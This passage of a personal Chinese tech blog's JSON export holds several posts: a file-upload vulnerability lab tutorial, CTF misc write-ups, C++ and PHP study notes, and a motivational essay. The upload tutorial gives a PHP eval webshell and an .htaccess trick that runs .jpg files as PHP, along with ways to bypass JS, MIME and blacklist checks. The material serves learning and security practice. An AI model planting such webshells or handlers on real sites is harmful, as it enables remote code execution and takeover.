仍需努力！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://qidian-png.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"暑假第一周练习(二)文件上传漏洞(一)","slug":"暑假第一周练习(二)文件上传漏洞(一)","date":"2020-07-11T06:35:05.000Z","updated":"2020-07-31T11:39:12.497Z","comments":true,"path":"2020/07/11/暑假第一周练习(二)文件上传漏洞(一)/","link":"","permalink":"https://qidian-png.github.io/2020/07/11/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E4%B8%80)/","excerpt":"","text":"# 文件上传漏洞 目录： 0×01 任意文件上传 0×02 JS限制 0×03 MIME限制 0×04 黑名单限制文件上传漏洞原理：大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制或者是过滤用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。 0×01 任意文件上传 没有任何条件限制，可上传任意文件。 直接上传我们的PHP一句话木马 1&lt;?php @eval($_POST[&#39;qidian&#39;]); ?&gt; 上传之后，显示出了文件所在的路径，类型等等。 上传成功代表着我们可以通过webshell访问网站 输入一些命令我们就可以查看网站的一些内容，例如查看网站PHP的版本信息： 1qidian&#x3D;phpinfo(); 可以通过webshell用不同的命令，得到网站的各种信息。当然我们也可以通过菜刀，蚁剑对我们有上传漏洞的网站可视化查看。上图使用蚁剑连接的，对我们webshell上传目录可视化。 0×02 JS限制 所谓JS限制就是在网页前端的JS 代码会对我们上传的文件的后缀或类型进行过滤，限制我们的上传。 123456789101112131415161718192021&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; function checkFile() &#123; var file &#x3D; document.getElementsByName(&#39;upfile&#39;)[0].value; if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123; alert(&quot;你还没有选择任何文件，不能上传!&quot;); return false; &#125; &#x2F;&#x2F;定义允许上传的文件类型 var allow_ext &#x3D; &quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;; &#x2F;&#x2F;提取上传文件的类型 var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F;alert(ext_name); &#x2F;&#x2F;alert(ext_name + &quot;|&quot;); &#x2F;&#x2F;判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123; var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; &#125; &#125; &lt;&#x2F;script&gt; 上面的代码会对我们上传的文件进行过滤，如果满足要求的格式，就允许我们上传，否则不行。我们的绕过方法就是把这段JS代码删除。通过firebug查看元素并删除调用checkFile() 的那句话就行了 绕过后就可以上传成功，查看图像得到上传路径。然后可以用菜刀连接。 我们也可以用BurpSuite抓包，改包进行绕过。 0×03 MIME限制 MIME限制就是文件类型限制。 12if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; 从上面的代码可以看到我们的Content-Type需要满足上面三种之一才可以上传。常见的：超文本标记语言文本 .html,html text/htm 普通文本 .txt text/plain RTF文本. rtf application/rtf GIF图形 .gif image/gif JPEG图形 . jpg image/jpeg PHP文件 .php application/octet-stream类型不对，无法上传。 当我们上传PHP文件时，因为类型不符合以上三种之一，就不能上传。 因此，我们需要通过抓包改包改变MIME 内容。 将Content-Type的内容改为 image/jpeg 就可以绕过MIME限制。 0×04 黑名单限制 文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传。上面就是黑名单里限制的格式。 我们可以将文件后缀改为 phtml ,php3 ,php5。也可以运用后缀的大小写进行绕过。也可以用后缀加点，加空格，点 +空格+点 绕过等等。 今天用重写文件解析绕过。( .htaccess文件) .htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 htaccess文件内容为：SetHandler application/x-httpd-php 123&lt;FilesMatch &quot;jpg&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; 即我们上传任何格式的文件都会被当作php文件执行。 先上传这样一个后缀为htaccess的文件，在上传一个.jpg的一句话，这样即使上传的一句话后缀为jpg依然可以连接一句话。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://qidian-png.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"暑假第一周练习(一)","slug":"暑假第一周练习(一) Misc","date":"2020-07-10T04:56:05.000Z","updated":"2020-07-31T11:47:14.098Z","comments":true,"path":"2020/07/10/暑假第一周练习(一) Misc/","link":"","permalink":"https://qidian-png.github.io/2020/07/10/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)%20Misc/","excerpt":"","text":"目录： 0×01 Misc之金三胖 0×02 Misc 二维码 0×03 Misc N种方法解决 0×04 Misc 大白 0×05 Misc 基础破解 0×06 Misc 你竟然赶我走 0×07 Misc 乌镇峰会种图 0×08 Misc LSB *0×01金三胖 * 下载好附件得到一个 格式为gif 的动图 从图里可以看到一些红字，然后我们就把GIF文件用stegsolve分割成一帧一帧的图片。 分成了89张图片，然后我们一张一张的看就得到了；得到了flag{he11ohongke} 是11不是ll 哈哈有坑 0×02 二维码 下载得到附件是一张二维码扫一下得到 secret is here 我天真的以为flag，果然交了就不对 就没了思路，看了大佬博客，于是乎就用binwalk扫了一下里面有一个zip文件分离出来 binwalk QR_code.png -e 得到兴奋了一会但是需要密码；接着上装备fcrackzip来暴力破解了` fcrackzip -b -c1 -l4 -u 1D7.zip `密码=7639 把CTF 换成flag就欧克了！！！ 0×03 N种方法解决 下载好得到一个exe文件，但是不可以运行，想一下应该是格式问题，拉进winhex看一下一张经过base64加密的图片！在线找个解密网站，解密得到扫一下，得到flag！ 0×04 大白 下载好是一张图片很明显图片的高度被改了，拉进winhex改一下，就会得到flag！！ 0×05 Misc 基础破解 下载是一个zip文件，解压之后是一个rar文件，里面有一个加密的txt文件！ 使用暴力破解，得到密码2563，然后得到一串字符ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30= base64解密得到flag！ 0×06 Misc 你竟然赶我走 下载是一张图片感觉挺正常的，没啥可改的，没思路就拉进winhex分析一下，滑倒最后的发现了flag。 0×07 Misc 乌镇峰会种图题目说了一大堆，拉进winhex一看和上题一样。 xswl 0×08 LSB附件：隐写题，用stegslove,看了好大一会也没啥东西！不过仔细看发现了一些不同。红绿蓝的0通道最上面都被遮住了，应该会有一些东西。用data extract 钩住红绿蓝的0通道。保存为png的图片，会得到一张二维码，扫一下的到flag。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Misc学习","slug":"Misc学习","permalink":"https://qidian-png.github.io/tags/Misc%E5%AD%A6%E4%B9%A0/"}]},{"title":"鸡汤","slug":"鸡汤  ——致君","date":"2020-06-03T09:05:05.000Z","updated":"2020-06-03T09:12:04.661Z","comments":true,"path":"2020/06/03/鸡汤  ——致君/","link":"","permalink":"https://qidian-png.github.io/2020/06/03/%E9%B8%A1%E6%B1%A4%20%20%E2%80%94%E2%80%94%E8%87%B4%E5%90%9B/","excerpt":"","text":"## 星辰和大海都需要门票，诗和远方的路费也都很贵。 星辰大海需要门票， 诗和远方路费很贵。 就像我们不努力的话， 情怀都养不起。 大海星辰皆不得， 梦想远方不可及。 人生有时候很苦逼， 如果不努力， 你拥有的一切， 都有可能失去； 即使努力了， 也会有很多东西得不到。 世间万物皆有属， 有付出才有可能收获。 世界上所有的美好都是给配得上的人， 所有的东西，都是很贵， 所以，我们有的时候只能努力。 因为所谓的大海星辰， 都是要靠我们自己来得到。 诗和远方都是我们所追求的， 但是，所谓的追求，只不过是我们的努力罢了。 我们总要追求我们的未来， 所以，我们现在一定要努力， 尽力配得上我们的情怀。","categories":[{"name":"生活","slug":"生活","permalink":"https://qidian-png.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"琐事","slug":"琐事","permalink":"https://qidian-png.github.io/tags/%E7%90%90%E4%BA%8B/"}]},{"title":"C++复习--函数的模板和重载","slug":"C++复习——函数模板和函数的重载","date":"2020-05-20T07:04:05.000Z","updated":"2020-07-31T13:03:44.920Z","comments":true,"path":"2020/05/20/C++复习——函数模板和函数的重载/","link":"","permalink":"https://qidian-png.github.io/2020/05/20/C++%E5%A4%8D%E4%B9%A0%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E6%A8%A1%E6%9D%BF%E5%92%8C%E5%87%BD%E6%95%B0%E7%9A%84%E9%87%8D%E8%BD%BD/","excerpt":"","text":"前言：慢慢复习路！！！ 目录：0×01：函数的重载0×02：函数的模板0×03：有默认参数的函数0×04：变量的引用0×05：将引用作为函数参数0×06：内置函数0×07：作用域运算符0×08：字符串变量0×09：动态分配/撤销内存的运算符new和delete 0×01：函数的重载 定义：C++允许在同一个域中用一个函数名定义多个函数，这些函数的参数个数、参数类型不相同。用一个函数名实现不同的功能，就是函数的重载。 例一： 123456789101112131415161718#include &lt;iostream&gt;using namespace std;int max(int a,int b,int c) &#x2F;&#x2F;求3个整数中的最大者&#123; if (b&gt;a) a&#x3D;b;if (c&gt;a) a&#x3D;c;return a; &#125; float max(float a,float b, float c) &#x2F;&#x2F;求3个实数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a; &#125; long max(long a,long b,long c) &#x2F;&#x2F;求3个长整数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a;&#125; 例二： 12345678910111213141516int main( )&#123;int a,b,c; float d,e,f; long g,h,i;cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; cin&gt;&gt;d&gt;&gt;e&gt;&gt;f;cin&gt;&gt;g&gt;&gt;h&gt;&gt;i;int m;m&#x3D; max(a,b,c); &#x2F;&#x2F;函数值为整型cout &lt;&lt;&quot;max_i&#x3D;&quot;&lt;&lt;m&lt;&lt;endl;float n;n&#x3D;max(d,e,f); &#x2F;&#x2F;函数值为实型cout&lt;&lt;&quot;max_f&#x3D;&quot;&lt;&lt;n&lt;&lt;endl;long int p;p&#x3D;max(g,h,i); &#x2F;&#x2F;函数值为长整型cout&lt;&lt;&quot;max_l&#x3D;&quot;&lt;&lt;p&lt;&lt;endl;return 0;&#125; 例三： 123456789下面的例子说明用函数重载设计参数个数不同的函数，用一个函数名求两个整数或三个整数中的最大数。#include &lt;iostream&gt;using namespace std;int max(int a,int b,int c) &#x2F;&#x2F;求3个整数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a;&#125; 注意：不允许函数参数个数、参数类型都相同，只是函数返回值不同。因为系统无法从调用形式上判断调用与哪个函数相匹配。 0×02：函数的模板 定义：如果两个函数的参数个数相同，函数的行为相同（做同样的事），只是函数和参数的数据类型不同，如果用函数重载的话，编写的函数代码是相同的，为了节省时间，C++提供了函数模板功能。(C++比C语言方便多了，小声bb) 格式： template typename 标识符[, typename 标识符, … … ] 函数定义（函数的类型和参数的类型用声明的标识符表示）template 是关键字，含义是模板 typename 是关键字，表示其后的标识符代表类型参数，调用时根据实参的类型确定形参的类型。 所谓函数模板，是建立一个通用函数，不指定函数类型和参数类型，而用一个虚拟的类型表示。在调用函数时，用实参的类型取代模板中的虚拟类型。 例1 为计算两个数中的大数定义函数模板 1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;T max(T a,T b,T c) &#x2F;&#x2F;用虚拟类型T表示类型&#123;if(b&gt;a) a&#x3D;b; if(c&gt;a) a&#x3D;c; return a;&#125;int main()&#123;int i1&#x3D;8,i2&#x3D;5,i3&#x3D;6,i; double d1&#x3D;56.9,d2&#x3D;90.765,d3&#x3D;43.1,d; long g1&#x3D;67843,g2&#x3D;-456,g3&#x3D;78123,g; i&#x3D;max(i1,i2,i3); d&#x3D;max(d1,d2,d3); g&#x3D;max(g1,g2,g3); cout&lt;&lt;&quot;i_max&#x3D;&quot;&lt;&lt;i&lt;&lt;endl; cout&lt;&lt;&quot;d_max&#x3D;&quot;&lt;&lt;d&lt;&lt;endl;cout&lt;&lt;&quot;g_max&#x3D;&quot;&lt;&lt;g&lt;&lt;endl; return 0;&#125; 注意：从程序中看到，此问题用函数模板比用函数重载更方便。注意，函数模板只适用于函数参数的个数相同而类型不同，并且函数体相同的情况，如果函数的参数个数不同，则不能用函数模板。0×03：有默认参数的函数 C++允许为函数的参数设置默认值，这时调用函数时，如果没有实参，就以默认值作为实参值。 格式： 形参类型 形参变量名 = 常数 功能：调用函数时，如果没有实参，就以常数作为该形参的值;如果有实参，仍以实参的值作为该形参的值。 注意：有默认值的形参必须放在形参表的右边，不允许无默认参数值和有默认参数值的形参交错排列。 字面意思不好理解，例子奉上。 1234567编写计算圆柱体体积函数 float volume ( float h, float r &#x3D; 12.5) 调用可以采用以下任何一种形式： volume( 45.6); volume( 32.5, 10.5); 函数参数结合从左到右，用第一种方式调用时，只有一个实参，圆半径的值取默认值12.5，用第二种方式调用时，有两个实参，圆半径的值取实参的值10.5。 注意：一、如果用函数原型声明，只要在函数原型声明中定义形参的默认值即可。 二、一个函数名不能同时用于重载函数和带默认形参值的函数。当调用函数时，如少写一个参数，系统无法判断是利用重载函数还是利用带默认参数值的函数，出现二义性。 0×04：变量的引用 C++提供了为变量取别名的功能，这就是变量的引用。格式： 类型 &amp;变量1 = 变量2变量2是在此之前已经定义过的变量，且与变量1的类型相同。这里为变量2定义一个别名变量1，在程序里变量1和变量2 就是同一个变量。注意：两个变量不能用同一个别名。 12345678例：int a &#x3D; 3 ,b &#x3D;4; int &amp;c &#x3D; a; &#x2F;&#x2F; c是a 的别名 int &amp;c &#x3D; b; &#x2F;&#x2F; 错误的用法 一个变量可以有多个别名 例：int a &#x3D; 3; int &amp; b&#x3D; a; int &amp; c&#x3D; b; 变量a 有两个别名b和c。 又来 1234567891011#include &lt;iostream&gt;using namespace std;int main( )&#123;int a&#x3D;10; int &amp;b&#x3D;a; &#x2F;&#x2F;声明b是a的引用 a&#x3D;a*a; &#x2F;&#x2F;a的值变化了，b的值也应一起变化 cout&lt;&lt;a&lt;&lt;&quot; &quot;&lt;&lt;b&lt;&lt;endl; b&#x3D;b&#x2F;5; &#x2F;&#x2F;b的值变化了，a的值也应一起变化 cout&lt;&lt;b&lt;&lt;&quot; &quot;&lt;&lt;a&lt;&lt;endl; return 0;&#125; 0×05：将引用作为函数参数 C++除了可以用普通变量、指针变量做形参外，还可以用引用变量做形参。 （1）用普通变量做形参 这时传递的是实参的值，在函数内形参与实参是两个不同的内存单元，对形参的修改不会影响实参的值。 123456789101112131415例：无法实现两个变量的值互换的程序#include &lt;iostream&gt;using namespace std;void swap(int a,int b)&#123; int temp; temp&#x3D;a; a&#x3D;b; b&#x3D;temp; &#x2F;&#x2F; 实现a和b的值互换&#125;int main( )&#123;int i&#x3D;3,j&#x3D;5; swap(i,j); cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl; &#x2F;&#x2F; i和j的值未互换 return 0;&#125; （2）用指针变量做形参 C语言还允许用指针变量做形参，这时传递的是实参变量的地址（指针），在函数内利用这个指针访问实参变量。 例1.11用指针变量做形参，实现两个变量值的交换。 1234567891011121314#include &lt;iostream&gt;using namespace std;void swap(int *p1,int *p2)&#123;int temp; temp&#x3D;*p1; *p1&#x3D; *p2; *p2&#x3D;temp;&#125;int main( )&#123;int i&#x3D;3,j&#x3D;5; swap(&amp;i,&amp;j); cout&lt;&lt;i&lt;&lt;&quot;,&quot;&lt;&lt;j&lt;&lt;endl; return 0;&#125; 3）用引用变量做形参 用指针变量做形参，它将实参变量的地址传递给形参，在函数内用“*指针变量”的方式访问实参变量。我们知道引用变量是变量的别名，在调用函数时，用引用变量做的形参就成了实参变量的别名，在函数中用的形参名就是实参的别名，这样比用指针变量更直观、更方便。 123456789101112131415例：利用引用变量实现两个变量值的交换#include &lt;iostream&gt;using namespace std;void swap(int &amp;a,int &amp;b)&#123;int temp; temp&#x3D;a; a&#x3D;b; b&#x3D;temp;&#125;int main( )&#123;int i&#x3D;3,j&#x3D;5; swap(i,j); cout&lt;&lt;&quot;i&#x3D;&quot;&lt;&lt;i&lt;&lt;&quot; &quot;&lt;&lt;&quot;j&#x3D;&quot;&lt;&lt;j&lt;&lt;endl; return 0;&#125; 对引用的进一步说明（1）引用变量都具有非void类型（2）不能建立引用的数组（3）可以建立常引用变量，不允许修改常引用变量的值例： int i ; const int &amp;a = i; a = 3; // 错误的用法 i = 8; // i 不是常变量，可以修改 （4）可以建立指针变量的引用变量例：int i; int *p = &amp; i; int * &amp;pt = p; // pt是p的别名变量，同时 // 也是指针变量 0×06：内置函数 C++ 提供了一种机制，在编译时，将所调用的函数的代码嵌入到调用函数代码中，在执行函数时省去了调用环节，提高了函数的执行速度。这种机制称为内置函数，有的书称内联函数。 格式： inline 函数类型 函数名(形参表) { 函数体 } inline 是C++的关键字，在编译时，编译程序会把这个函数嵌入到调用函数的函数体中 调用格式： 函数名（实参表） 12345678910111213141516例：计算三个整数中的大数#include &lt;iostream&gt;using namespace std;inline int max(int a,int b,int c) &#x2F;&#x2F; 这是一个内置函数， &#x2F;&#x2F; 求3个整数中的最大者&#123;if (b&gt;a) a&#x3D;b; if (c&gt;a) a&#x3D;c; return a;&#125; int main( )&#123;int i&#x3D;7,j&#x3D;10,k&#x3D;25,m; m&#x3D;max(i,j,k); cout&lt;&lt;&quot;max&#x3D;&quot;&lt;&lt;m&lt;&lt;endl; return 0;&#125; 由于在定义函数时指定它是内置函数，因此编译系统在遇到函数调用max( i,j,k ) 时就用max函数体的代码代替max( i,j,k ) ，同时用实参代替形参。调用语句m= max( i,j,k ) 就被置换成： { a=i ; b = j ; c= k; if ( b&gt;a) a=b; if ( c&gt;a) a=c; m=a; } 1234567891011例:用内置函数计算平方根#include &lt;iostream&gt;using namespace std;inline int power(int x) &#x2F;&#x2F;定义内置函数&#123;return x*x;&#125;int main()&#123;cout&lt;&lt;power(2)&lt;&lt;endl; cout&lt;&lt;power(1+1)&lt;&lt;endl; return 0;&#125; 编译程序遇见内置函数power时，先求出函数的实参值（1+1=2），然后用power函数体代替函数调用，调用语句变成： { cout&lt;&lt;22&lt;&lt;endl; cout&lt;&lt;22&lt;&lt;endl; } 运行结果是 4 4 优缺点：使用内置函数可以节省程序的运行时间，但增加了目标程序的长度。所以在使用时要衡量时间和空间的得失。 0×07：作用域运算符直接看例子： 12345678局部变量和全局变量同名 #include &lt;iostream&gt; using namespace std; float a&#x3D;13.5; int main( ) &#123; int a&#x3D;5; cout&lt;&lt;a&lt;&lt;endl; return 0; &#125; 程序中有两个变量a，一个是全局变量，另一个是main函数的局部变量，根据局部变量会屏蔽同名的全局变量规则，在函数中出现的变量a是局部变量，因此输出的值是5，而不是13.5，为了在函数中访问全局变量C++提供了作用域运算符 :: ，可以用来指定要访问的作用域，可以把main函数改写成 123456789#include &lt;iostream&gt; using namespace std; float a&#x3D;13.5; int main( ) &#123;int a&#x3D;5; cout&lt;&lt;a&lt;&lt;endl; cout&lt;&lt;::a&lt;&lt;endl; return 0; &#125; ::a表示全局变量a。注意不能用::访问局部变量。 0×08：字符串变量 C++提供了字符串类类型string，实际上它不是C++的基本类型，它是在C++标准库中声明的一个字符串类，程序可以用它定义对象。 1.定义字符串变量 格式： string 变量名表; 可以在定义变量时用字符串常量为变量赋初值： string 变量名 = 字符串常量 注意：如用字符串变量，在程序开始要用包含语句把C++标准库的string头文件包含进来。 2.对字符串操作① 对字符串变量赋值 字符串变量= 字符串表达式例： string st1,st2; st1 = “王点点“; st2 = st1; ② 访问字符串中的字符C++允许把字符串作为字符数组，第一个字符的下标是0，第二个字符的下标是1，以此类推。例：string w = “ then”; w[2] = ‘e’;结果字符串w变成 than ③输入输出字符串格式：cin &gt;&gt; 字符串变量 cout &lt;&lt; 字符串变量 ④字符串连接运算格式：字符串1 + 字符串2功能：把连接运算符两端的字符连接成一个字符串。表达式中可以用字符串常量也可以用字符串变量。例：string st1=“C++”; string st2=“Language”; st1 = st1 + st2 ;结果是 C++Language ⑤字符串的比较运算 可以用关系运算符&gt;、&gt;=、==、!=、&lt;、&lt;=对两个字符串同一位置的字符进行比较，根据ASCII码值判定字符的大小。 例：”china” &gt; “chinese” 运算结果是假。 0×09：动态分配/撤销内存的运算符new和delete 分配内存运算new 类型 [ （初值）]类型是决定分配空间尺寸的关键元素，如果运算结果正确，它的值是分配内存空间的起始地址，否则返回NULL。 12345例：int *a &#x3D;new int ; int *b &#x3D;new int( 100); char *ch &#x3D; new char[10]; int * q &#x3D; new int [5][4]; float * p &#x3D; new float(3.14159); 归还动态内存运算delete[] 指针变量[] 代表数组，如果不是数组可以省略[]。运算功能：撤销指针变量所指的动态内存空间，指针变量的数据类型决定了空间尺寸的大小。 123例：char *p&#x3D;new char[10]; … … delete [ ] p; 12345678910111213141516171819例1.18用动态内存存放结构体变量#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;struct student &#123;char name [10]; int num; char sex;&#125;;int main ( )&#123;student *p; p&#x3D;new student; strcpy(p-&gt;name,&quot;Wang Fun&quot;); p-&gt;num&#x3D;10123; p-&gt;sex&#x3D;&#39;M&#39;; cout&lt;&lt;p-&gt;name&lt;&lt;&quot; &quot;&lt;&lt;p-&gt;num&lt;&lt;&quot; &quot;&lt;&lt;p-&gt;sex&lt;&lt;endl; delete p; return 0;&#125; 先声明了一个结构体类型student，定义一个指向它的指针变量p，用new开辟一个空间存放一个student类型变量。如果无法正常分配内存，运算会返回一个空指针NULL，程序可以设计判断结构，根据判断结果决定怎样操作。注意不要混合使用new、delete、malloc、free。要正确搭配，不要用new分配内存后，又用free释放内存。 明天继续复习！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"c++学习","slug":"c-学习","permalink":"https://qidian-png.github.io/tags/c-%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--函数（五）","slug":"php学习--函数（五）","date":"2020-05-15T07:04:05.000Z","updated":"2020-07-31T13:01:51.051Z","comments":true,"path":"2020/05/15/php学习--函数（五）/","link":"","permalink":"https://qidian-png.github.io/2020/05/15/php%E5%AD%A6%E4%B9%A0--%E5%87%BD%E6%95%B0%EF%BC%88%E4%BA%94%EF%BC%89/","excerpt":"","text":"目录： 0×01：自定义函数 0×02：变量范围 0×03：参数传递，可变函数 0×04：递归函数 0×01：自定义函数 ①函数定义 定义：function 函数（参数1，参数2，…..，参数N）{ 函数体； //任意有效PHP代码 return 表达式； //不强制写，但写了return 没有表达式，则返回值为null；return也表示代码的结束} ②函数的调用注意：无论是系统给的函数，还是自己定义的，如果没有被调用都不会执行！函数调用后执行函数体中的代码，执行完毕后，自动返回调用的位置继续向下执行。 ③函数的参数形式参数由零个，一个或者多个变量组成。实际参数由零个，一个或者多个参数组成，每个参数是一个表达式，由逗号分隔。④函数的返回值函数的返回值是将函数执行的结果返回给函数的调用者如果不写返回，则默认返回值为NULL 0×02：变量范围 ①局部变量也称为内部变量，是在函数内部定义的，当然其适用范围仅限于函数内部，在函数外部肯定使用不了。 123function test()&#123;$a&#x3D;1&#125; 这个a就是局部变量②全局变量也称为外部变量，是在函数外部定义的，其使用范围从变量定义到程序结束。全局变量要使用需要使用global定义。 ③静态变量 在函数内部定义变量的时候使用static来定义变量。特点：函数执行完毕之后变量不会立即消失，再次调用函数时，函数将会保留上次使用过后的只，并且只在第一次执行函数的时候初始化值。 1234567function test（）&#123;static $a-10;echo ++$a;&#125;test();echo &lt;br &#x2F;&gt;;test(); 两次输出的值为11，12. 0×03：参数传递，可变函数 ①按值传递参数我们在传递参数时，如果没有声明，就默认为这种方式！这种方式下改变形式参数的值而不会影响到实际参数的值，，相当于两者没有关系。 ②按引用传递参数相当于形式参数和实际参数指的是同一个人，形式参数的改变会直接影响到实际参数的值！ ③函数的默认参数可以给形式参数设置默认值，直接赋值即可。赋值规则：从左向右，右边的参数必须有值，才能给左边的赋值。 ④可变长度参数列表 123func_get_args() &#x2F;&#x2F;获取参数的类型，信息func_get_arg() &#x2F;&#x2F;调用此函数时，可以传入一个值（从0开始），表示获取第几个实际参数的信息func_num_args() &#x2F;&#x2F;返回传入参数的类型，个数 在函数内部使用，返回给我们一些参数信息。 ⑤可变函数 12345function test（）&#123;echo &#39;我是菜鸟&#39;&#125;$a&#x3D;test(); &#x2F;&#x2F;把函数的名字加上引号赋给变量即可$a() &#x2F;&#x2F;test() 0×04：递归函数 递归函数即为自调用函数，在函数体内直接或间接自己调用自己，但需要设置自调用的条件，若满足条件，则调用函数本身，若不满足则终止本函数的自调用，然后把目前流程的主控权交回给上一层函数来执行。 12345678910111213&lt;?php function test($n)&#123; echo $n . &quot; &quot;; if ($n &gt; 0) &#123; test($n - 1); &#125; else &#123; echo &quot;&lt;--&gt;&quot;; &#125; echo $n . &quot; &quot;; &#125; test(10);?&gt; 函数输出的结果： 10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0 1 2 3 4 5 6 7 8 9 10（我也是理解了很久才明白的，有点绕不回来） 执行test(10)，echo 10，然后因为10&gt;0，执行test(9)，后面还有没来得及执行的echo 10所以先留来一个10，到第二步时执行test(9) ，echo 9,9&gt;0 ,执行test（9），后面的同样没来得及执行 echo 9，这样保留了一个 9，最外层时10 ， 然后9，8，7，6，5，4，3，2，1……………最后执行到0时，输出 10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0 此时函数已经不再调用自己，开始将流程的主控权交回给上一层函数来执行。 从内而外输出1，2，3，4，5，6，7，8，9，10，最后的输出结果10 9 8 7 6 5 4 3 2 1 0 &lt;--&gt; 0 1 2 3 4 5 6 7 8 9 10递归函数就结束了。 0×05：内部（内置）函数 php提供给我们很多的现成的函数，来给我们使用。(类似于C语言的库，使用时提前声明) 开启一些扩展模块","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"php学习--各种语句（四）","slug":"php学习--各种语句（四）","date":"2020-05-10T07:04:05.000Z","updated":"2020-05-20T15:39:00.615Z","comments":true,"path":"2020/05/10/php学习--各种语句（四）/","link":"","permalink":"https://qidian-png.github.io/2020/05/10/php%E5%AD%A6%E4%B9%A0--%E5%90%84%E7%A7%8D%E8%AF%AD%E5%8F%A5%EF%BC%88%E5%9B%9B%EF%BC%89/","excerpt":"","text":"目录：0×01: if语句0×02：switch 语句0×03：循环语句0×04：特殊的控制语句 0×01:if语句 ① if(表达式) 语句(代码块)； 如果表达式的值为true，就执行后面的语句或者代码块；反之跳过这个语句。 123456$a&#x3D;18;$b&#x3D;15;if($b&gt;&#x3D;$a) &#123;echo &quot;你已经成年！&quot;&#125;echo &quot;你还未成年！&quot; ②if…..else..语句 1234if(语句)&#123; 1 &#125;else&#123; 2 &#125; &#x2F;&#x2F;如果语句为true，则执行1，为false则执行2。 ③ifelse ifelse ifelse 语句 12345678if（语句1）&#123; 结果1&#125;else if（语句2）&#123; 结果2 &#125;else if（语句3）&#123;结果3&#125; &#x2F;&#x2F;首先判断语句1是否为true，为true则执行结果1，为false则判断语句2，语句2 为true则执行结果2，否则判断语句3，直到结束或为true。else &#123;结果4&#125; 0×02：switch 语句 12345678910111213141516switch（表达式）&#123; case 值1： 结果1； break； case 值2： 结果2； break； case 值3： 结果3； break； default： 语句N； &#125; 注意：表达式的值=值几的时候，才会执行结果几。如果都不满足则执行最后一个default语句，break是必不可少的结束符。 0×03：循环语句 ①while语句 123while（表达式）&#123;各种语句&#125; 当表达式的值为true，执行各种语句，直到表达式的值为false。 ②do….while 语句 123do&#123;各种语句&#125; while（表达式）；&#x2F;&#x2F;先执行各种语句，再判断表达式的真假。 注意：while（）与do()...while的区别在于do ...while语句至少会被执行一次。 ③for语句 12for（语句1；语句2；语句3）&#123;各种语句&#125; 语句1：多为初始化的语句，$a=0;语句2：多为判断是否为真值。语句3：变量自增，自减的语句。注意：无论是语句1，还是语句2，都可以放多个表达式，中间需要用逗号隔开。 0×04：特殊的控制语句 ①break语句 